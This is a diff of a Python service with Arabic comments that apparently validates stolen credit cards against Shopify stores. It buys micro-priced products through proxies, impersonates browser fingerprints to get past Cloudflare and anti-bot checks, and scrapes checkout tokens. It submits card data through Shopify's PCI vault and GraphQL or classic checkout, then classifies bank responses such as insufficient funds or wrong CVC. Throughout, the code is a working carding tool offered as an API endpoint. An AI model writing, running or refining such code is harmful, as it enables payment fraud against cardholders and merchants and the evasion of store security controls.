@@ -17,13 +17,11 @@ def format_proxy(proxy_str):
     return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"
 
 def safe_response(msg, price, gate):
-    """تشفير مسميات الأخطاء لحماية البروكسي في البوت"""
     clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
     clean_price = str(price).replace('$', '').strip() if price else "-"
     return {"Response": clean_msg, "Price": clean_price, "Gate": gate}
 
 async def get_micro_product(session, store_url):
-    """سحب منتج بسعر رخيص لتجنب الحظر البنكي وتجنب العملات الفلكية"""
     endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
     for ep in endpoints:
         try:
@@ -45,10 +43,10 @@ async def get_micro_product(session, store_url):
         except: continue
     return None, "-"
 
-async def check_shopify_final(cc_info, store_url, proxy):
+async def check_shopify_merged(cc_info, store_url, proxy):
     try:
         cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
-        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Engine")
+        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Merged")
         cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
         if len(yy) == 2: yy = "20" + yy
 
@@ -57,32 +55,37 @@ async def check_shopify_final(cc_info, store_url, proxy):
         proxies = {"http": format_proxy(proxy), "https": format_proxy(proxy)} if proxy else None
 
         buyer = {
-            "email": f"customer.{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Miller",
-            "address1": "350 5th Ave", "city": "New York", "province": "NY", "zip": "10118", "country": "US", "phone": "2127363100"
+            "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "John", "last_name": "Doe",
+            "address1": "123 Main Street", "city": "New York", "province": "NY", "zip": "10001", "country": "US", "phone": "2125551234"
         }
 
-        # استخدام بصمة Safari لتخطي Cloudflare Turnstile على السيرفرات السحابية
-        async with AsyncSession(impersonate="safari15_3", proxies=proxies, timeout=60) as session:
+        # 1. الاعتماد على البصمة النقية لتخطي Cloudflare كما نجحنا سابقاً
+        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
             
-            # 1. جلب المنتج
             variant_id, price = await get_micro_product(session, store_url)
-            if not variant_id: return safe_response("No micro-priced product found", "-", "Shopify Engine")
+            if not variant_id: return safe_response("No micro-priced product found", "-", "Shopify Merged")
 
-            # 2. الهجوم بالرابط المباشر (Permalink) لتخطي WAF السلة
-            chk_url = f"{store_url}/cart/{variant_id}:1"
-            res_chk = await session.get(chk_url, allow_redirects=True)
+            # 2. الإضافة الشرعية للسلة (بدون هيدرز معقدة تثير الشكوك)
+            add_res = await session.post(f"{store_url}/cart/add.js", data={"id": variant_id, "quantity": "1"}, headers={"X-Requested-With": "XMLHttpRequest"})
+            if add_res.status_code not in [200, 201]: return safe_response("Anti-Bot Blocked Cart Add", price, "Shopify Merged")
+
+            await asyncio.sleep(0.5)
+
+            # 3. التوجه الطبيعي لصفحة الدفع (هذا المسار هو الذي يتخطى Cloudflare)
+            res_chk = await session.get(f"{store_url}/checkout", allow_redirects=True)
             html_chk = res_chk.text
             final_url = str(res_chk.url)
 
-            # فحص حظر WAF الحقيقي
             if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
-                return safe_response("Cloudflare WAF Blocked IP", price, "Shopify Engine")
-            
-            # 3. التحليل الجزيئي لاستخراج التوكن (JSON + HTML + Meta)
+                return safe_response("Cloudflare WAF Blocked IP", price, "Shopify Merged")
+
+            if "/cart" in final_url and "/checkout" not in final_url:
+                return safe_response("Redirected to Cart (Session Blocked)", price, "Shopify Merged")
+
+            # 4. دمج محرك استخراج التوكن من سكربت neww.py
             is_graphql = False
             session_token, classic_token, checkout_token = None, None, None
 
-            # أ. فحص نظام 2025 (Extensibility)
             meta_match = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
             if meta_match:
                 is_graphql = True
@@ -92,15 +95,11 @@ async def check_shopify_final(cc_info, store_url, proxy):
                 else:
                     ct_js = re.search(r'checkout_token["\']?\s*:\s*["\']([^"\']+)["\']', html_chk)
                     checkout_token = ct_js.group(1) if ct_js else "unknown"
-            
-            # ب. فحص نظام Classic (مع استخراج JSON العميق)
             else:
                 patterns = [
                     r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', 
                     r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']', 
-                    r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']',
-                    r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']', # JSON CSRF
-                    r'authenticity_token["\']?\s*:\s*["\']([^"\']+)["\']' # JSON Auth
+                    r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']'
                 ]
                 for p in patterns:
                     match = re.search(p, html_chk, re.IGNORECASE)
@@ -108,25 +107,19 @@ async def check_shopify_final(cc_info, store_url, proxy):
                         classic_token = unescape(match.group(1))
                         break
 
-            # التحقق من وجود توكن
             if not is_graphql and not classic_token:
                 title = re.search(r'<title>([^<]+)</title>', html_chk)
                 page_title = title.group(1).strip() if title else "Unknown"
-                
-                # ربما الموقع يستخدم بوابة خارجية (ShopPay / Paypal)
-                if "shop.app" in final_url or "paypal" in final_url:
-                    return safe_response("Redirected to External Gate (ShopPay/PayPal)", price, "Shopify Engine")
-                    
-                return safe_response(f"Token Hidden in JS ({page_title[:15]})", price, "Shopify Engine")
+                return safe_response(f"Token Extractor Failed ({page_title[:15]})", price, "Shopify Merged")
 
-            # 4. تشفير البطاقة (PCI Vault)
+            # 5. تشفير البطاقة بشكل آمن (إصلاح مشكلة Stripe)
             pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
             res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
-            if res_pci.status_code != 200: return safe_response("Stripe Payment WAF Blocked IP", price, "Shopify Engine")
+            if res_pci.status_code != 200: return safe_response("Stripe Payment WAF Blocked IP", price, "Shopify Merged")
             card_session_id = res_pci.json().get("id")
 
             # =================================================================
-            # المسار الأول: GraphQL Extensibility (مستخرج بالكامل من neww.py)
+            # المسار الأول: GraphQL Extensibility (مُحدث ليتوافق مع التغييرات الأخيرة)
             # =================================================================
             if is_graphql:
                 gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
@@ -138,7 +131,7 @@ async def check_shopify_final(cc_info, store_url, proxy):
                 prop_vars = {"delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]}, "sessionInput": {"sessionToken": session_token}}
                 res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
                 queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
-                if not queue_token: return safe_response("GraphQL Negotiate Failed", price, "Shopify GQL")
+                if not queue_token: return safe_response("GraphQL Negotiate Failed", price, "Shopify Merged (GQL)")
 
                 await asyncio.sleep(1)
 
@@ -151,10 +144,10 @@ async def check_shopify_final(cc_info, store_url, proxy):
                 if rtype == 'SubmitRejected':
                     errs = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('errors', [])
                     msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'System Rejected'
-                    return safe_response(msg, price, "Shopify GQL")
+                    return safe_response(msg, price, "Shopify Merged (GQL)")
 
                 receipt_id = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('id')
-                if not receipt_id: return safe_response("GraphQL Submit Failed", price, "Shopify GQL")
+                if not receipt_id: return safe_response("GraphQL Submit Failed", price, "Shopify Merged (GQL)")
 
                 poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                 poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}...on ActionRequiredReceipt{id}}}"""
@@ -162,16 +155,16 @@ async def check_shopify_final(cc_info, store_url, proxy):
                     res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                     if res_poll.status_code == 200:
                         p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
-                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify GQL")
+                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify Merged (GQL)")
                         elif p_type == 'FailedReceipt':
                             err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
-                            if "INSUFFICIENT" in err: return safe_response("Insufficient Funds", price, "Shopify GQL")
-                            elif "CVC" in err: return safe_response("Incorrect CVC", price, "Shopify GQL")
-                            elif "ZIP" in err or "ADDRESS" in err: return safe_response("ZIP Code Mismatch", price, "Shopify GQL")
-                            elif "DO_NOT_HONOR" in err: return safe_response("Do Not Honor", price, "Shopify GQL")
-                            return safe_response(f"Declined: {err}", price, "Shopify GQL")
+                            if "INSUFFICIENT" in err: return safe_response("Insufficient Funds", price, "Shopify Merged (GQL)")
+                            elif "CVC" in err: return safe_response("Incorrect CVC", price, "Shopify Merged (GQL)")
+                            elif "ZIP" in err or "ADDRESS" in err: return safe_response("ZIP Code Mismatch", price, "Shopify Merged (GQL)")
+                            elif "DO_NOT_HONOR" in err: return safe_response("Do Not Honor", price, "Shopify Merged (GQL)")
+                            return safe_response(f"Declined: {err}", price, "Shopify Merged (GQL)")
                     await asyncio.sleep(1.5)
-                return safe_response("Timeout waiting for Bank", price, "Shopify GQL")
+                return safe_response("Timeout waiting for Bank", price, "Shopify Merged (GQL)")
             
             # =================================================================
             # المسار الثاني: Classic HTML
@@ -195,18 +188,18 @@ async def check_shopify_final(cc_info, store_url, proxy):
                 res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True)
                 res_text = res_pay.text.lower()
                 
-                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify Classic")
-                elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Classic")
-                elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Classic")
-                elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify Classic")
-                elif "do not honor" in res_text: return safe_response("Do Not Honor", price, "Shopify Classic")
+                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify Merged (Classic)")
+                elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Merged (Classic)")
+                elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Merged (Classic)")
+                elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify Merged (Classic)")
+                elif "do not honor" in res_text: return safe_response("Do Not Honor", price, "Shopify Merged (Classic)")
                 else:
                     err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
-                    return safe_response(err.group(1).strip() if err else "Declined / Bank Block", price, "Shopify Classic")
+                    return safe_response(err.group(1).strip() if err else "Declined / Bank Block", price, "Shopify Merged (Classic)")
 
     except Exception as e:
         return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify API")
 
 @app.get("/code/index.php")
 async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
-    return JSONResponse(content=await check_shopify_final(cc, url, proxy))
+    return JSONResponse(content=await check_shopify_merged(cc, url, proxy))
